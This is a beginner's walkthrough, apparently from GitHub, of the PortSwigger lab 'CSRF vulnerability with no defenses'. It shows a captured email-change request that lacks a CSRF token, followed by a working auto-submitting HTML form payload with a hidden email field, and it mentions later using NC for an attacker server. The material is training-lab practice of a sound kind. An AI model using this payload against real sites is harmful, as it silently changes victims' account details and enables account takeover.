# We will solve laps from(portswigger,juice-shop,DVWA) one lap from every one
## First portswigger lap..
## LAB NAME:**CSRF vulnerability with no defenses**
**first look at the http request**
```HTTP
POST /my-account/change-email HTTP/1.1 //Request dirctory (/my-account/change-email)
Host: 0af200f203c21e1d8299a19200cb0088.web-security-academy.net
Cookie: session=woF7oxa0zHYzxZGPBrWYT4LjQBzEENBw //that used cookies let's take a look about csrf tokens
Content-Length: 24
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://0af200f203c21e1d8299a19200cb0088.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml<img width="2880" height="1732" alt="f" src="https://github.com/user-attachments/assets/5bad850d-1a8d-4f13-ab10-70fb0557e91d" />
;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0af200f203c21e1d8299a19200cb0088.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

email=sajbfv%40gmail.com //email parameter
```
## As we look no csrf tokens 

**to attack you want to set server the lap is give you a server to work with but in the next or second modul we will
set our server with NC (because we will use it in the XSS) but don't think about it for now we just need to know the fundmentals.**

# OK

go to the sever the lap is gived you set you payload as we learn in the explaintaion we know how payload work

**the payload**
```HTML
<html>
   <body>
      <form action="https://0af200f203c21e1d8299a19200cb0088.web-security-academy.net/my-account/change-email" method="POST"> //as we explain in the senario in the first module we give the victam browser a request we are tell him go to this domain
         <input type="hidden" name="email" value="shaboli@sabola.com"> //but this hidden inbut 
      </form>

      <script>
         document.forms[0].submit();//when the victam just click on the link that script hit submit auto and the victam dosn't know any thin 
      </script>
   </body>
</html>
```
## that's all about the portswigger lap

### First open the proxy on burpsuite and chose open the browser

<img width="2880" height="1732" alt="f" src="https://github.com/user-attachments/assets/7c8d32c8-25e7-473c-a928-36dc584d963d" />

### open the lap 

<img width="1317" height="375" alt="a" src="https://github.com/user-attachments/assets/01808ed9-72aa-4f83-9609-49d0d9aacb7d" />

### Write your info 

<img width="1549" height="780" alt="d" src="https://github.com/user-attachments/assets/93ef6d67-e43b-4c69-ab3b-2800a347f7cb" />

### change email

<img width="1549" height="602" alt="e" src="https://github.com/user-attachments/assets/fc53524c-426c-4c16-9515-8a1202e71053" />

### Before submit the request make intercept on than submit

<img width="168" height="41" alt="H" src="https://github.com/user-attachments/assets/3e7c7782-e0cb-41a3-8eba-454c2f7042a6" />

### Take a look to the request there is no **CSRF TOKENS** and look to the dirctory of the request on the first line

POST /my-account/change-email HTTP/1.1 //Request dirctory (/my-account/change-email)

<img width="1131" height="347" alt="Screenshot_20260409_022613" src="https://github.com/user-attachments/assets/a33b9d4a-47b6-4b4e-9740-82ca31941d7a" />

### Now open the exploit server on the lap page 

<img width="368" height="126" alt="Screenshot_20260409_023100" src="https://github.com/user-attachments/assets/3603be0e-48da-47a2-96ba-847386173042" />

### copy the email form on the lab page

<img width="1900" height="996" alt="Screenshot_20260409_022934" src="https://github.com/user-attachments/assets/44f8ea38-5fbe-45fc-ba19-20dbcd16d08e" />
<img width="1319" height="1058" alt="Screenshot_20260409_023012" src="https://github.com/user-attachments/assets/2f40dece-06f6-4446-978a-e4c40a52e9a2" />

## focus on this keep the same form but change the action to send the form to the /webpage/

my-account/change-email
okay add your html tag add body and after the form end with </form>
add that script to submit the request automaticlly when requset send without user action

<img width="2166" height="1184" alt="Screenshot_20260409_023659" src="https://github.com/user-attachments/assets/42c9d038-335b-4139-94bb-ad6d3e1d0a61" />

### send the exploit and booom you win

<img width="2865" height="413" alt="Screenshot_20260409_023740" src="https://github.com/user-attachments/assets/8217a65e-bd23-4db8-97d2-57c82c7b0698" />



